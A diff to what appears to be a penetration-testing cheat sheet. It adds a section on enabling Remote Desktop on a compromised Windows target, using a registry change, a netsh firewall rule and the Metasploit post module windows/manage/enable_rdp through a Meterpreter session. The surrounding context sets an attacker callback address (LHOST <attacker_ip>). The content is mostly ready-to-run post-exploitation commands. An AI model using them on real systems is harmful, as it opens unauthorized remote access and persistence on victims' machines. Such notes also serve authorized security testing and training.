@@ -70,3 +70,26 @@ set LHOST <attacker_ip>
 set LPORT <port>
 exploit
 ```
+
+
+## Enabling RDP
+
+The following commands enable RDP and allows traffic through the firewall.
+
+```bash
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+```
+
+#### Metasploit
+To enable RDP on a Windows target, you can use the **Metasploit module** `windows/manage/enable_rdp`.
+ 1. Gain access to the target machine using a Meterpreter session.
+ 2. Use the `windows/manage/enable_rdp` module.
+```bash
+use windows/manage/enable_rdp
+set RHOST <target_ip>
+set SESSION <seesion_id>
+set RPORT 3389
+run
+```
